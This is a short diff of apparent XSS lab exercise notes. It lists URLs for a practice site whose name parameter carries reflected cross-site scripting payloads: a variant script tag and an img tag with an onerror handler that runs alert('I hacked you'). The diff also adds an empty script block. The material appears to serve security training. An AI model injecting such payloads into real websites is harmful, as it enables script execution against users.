@@ -17,3 +17,8 @@ https://labo.poney.pink/v01/xss/ex1e/?name=<SCRIPT   a="">alert("I hacked you")<
 
 Ex6:
 https://labo.poney.pink/v01/xss/ex1f/?name=<img src="/404.png" onerror="alert('I hacked you')"/>
+
+Ex7:
+<script>
+    
+</script>
